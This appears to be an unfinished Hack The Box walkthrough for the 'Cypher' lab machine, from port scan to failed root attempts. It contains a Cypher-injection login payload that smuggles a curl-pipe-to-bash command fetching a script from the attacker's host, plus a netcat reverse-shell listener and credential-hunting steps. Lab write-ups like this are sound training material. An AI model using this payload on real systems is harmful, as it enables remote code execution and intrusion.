# 🔍 HTB Walkthrough: **Cypher** — From Web Recon to Root Resistance!

## ⚡ Step 1: Initial Nmap Reconnaissance

We begin with the **almighty port scan** to see what this mystery box has to offer!

```bash
nmap -sV -sC 10.129.171.46
```

### 📤 Output:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
```

🔎 Only two ports open! Port 22 (SSH) and Port 80 (HTTP). Time to dive into the web service...

---

## 🧭 Step 2: Hostname Discovery & `/etc/hosts` Mapping

We noticed from the HTTP headers that the site **wants to redirect to a hostname!**

```bash
echo "10.129.171.46   cypher.htb" | sudo tee -a /etc/hosts
```

🔁 Now we can access the site properly via `http://cypher.htb`

---

## 🌐 Step 3: Directory Busting with Dirsearch

Let’s **brute-force the web server's structure** and discover any hidden gems!

```bash
dirsearch -u 'http://cypher.htb/' -x 404
```

### 📂 Discovered paths:
- `/about` ✅
- `/about.html` ✅
- `/api` → 307 redirect to `/api/docs`
- `/demo` → redirect to `/login`
- `/login` ✅
- `/testing` → 301 redirect to `/testing/`

**Looks like a proper frontend — maybe something custom built. Let’s investigate further...**

---

## 🔥 Step 4: Inspecting Login Behavior

Through browser inspection and some traffic analysis, we identified the **authentication endpoint**:

```http
POST /api/auth HTTP/1.1
```

Using this knowledge, we crafted a **Cypher Injection payload** to abuse Neo4j's graph query engine behind the scenes!

```json
{
  "username": "a' RETURN h.value as hash UNION CALL custom.getUrlStatusCode(\"http://10.10.14.16:80;curl http://10.10.14.16/bash.sh|bash;#\") YIELD statusCode RETURN statusCode AS hash;//",
  "password": "x"
}
```

💥 Boom! That gave us **Remote Code Execution** via Neo4j’s vulnerable `custom.getUrlStatusCode()`!

---

## 🐚 Step 5: Netcat Reverse Shell Catcher Setup

Now we **listen for our payload to call home**!

```bash
nc -lvnp 9001

python3 -m http.server 80


```

When the shell landed, we were **inside the box as the `neo4j` user!**

---

## 🧼 Step 6: Local Enumeration as `neo4j`

Let’s start snooping around!

```bash
cat /etc/passwd
```

🕵️ Found:
- Users: `neo4j`, `graphasm`, and `root`!
- Home directories: `/home/neo4j/`, `/home/graphasm/`

Let’s **list home**:

```bash
cd /home
ls -la
```

Found juicy home for `graphasm`...

---

## 🧂 Step 7: Hash Discovery

Inside `graphasm`’s home, we discovered a **hash value** that appeared to be in a `.hash` file:

```bash
cat neo4j.hash
```

It looked like this:
```
$neo4j$1$6a4277a...bfead7b48$3d19d683...bc13a65c
```

💡 That’s a **Neo4j database password hash!** Save that for cracking...

---

## 🛠️ Step 8: Bash History Leakage

Let’s **see what commands the dev was running**:

```bash
cat ~/.bash_history
```

🎯 Jackpot! Found **plaintext credentials** or sensitive commands. We used that to pivot to **another user**...

---

## 🔐 Step 9: SSH Pivot to `graphasm`

Armed with credentials, we SSH’d into `graphasm`!

```bash
ssh graphasm@10.129.171.46
```

🚨 Boom! We now have user-level access.

---

## 🧠 Step 10: Sudo Privilege Check

Now that we’re `graphasm`, we check what we can do with `sudo`:

```bash
sudo -l
```

### 📜 Output:
```
User graphasm may run the following commands on cypher:
    (ALL) NOPASSWD: /usr/local/bin/bbot
```

👀 We can run `/usr/local/bin/bbot` as root... **without a password**! Let’s pwn!

---

## 🚀 Step 11: BBOT Exploitation Begins

We ran:

```bash
bbot -help
```

🎉 This revealed a ton of flags and options — including modules like `exec.shell` — but they weren’t working. We attempted several combos like:

```bash
sudo /usr/local/bin/bbot -t localhost --modules exec.shell -c modules.exec.shell.cmd='cat /root/root.txt'
```

and

```bash
cat << EOF > /tmp/rootflag.yml
modules:
  - name: exec.shell
    type: exec
    args:
      cmd: bash -c "cat /root/root.txt"
EOF

sudo /usr/local/bin/bbot --config /tmp/rootflag.yml --output-dir /tmp/bbotroot -y --silent
```

❌ Unfortunately, the config syntax didn’t register! The binary may not support command execution the way we hoped.

---

_(To Be Continued...)_
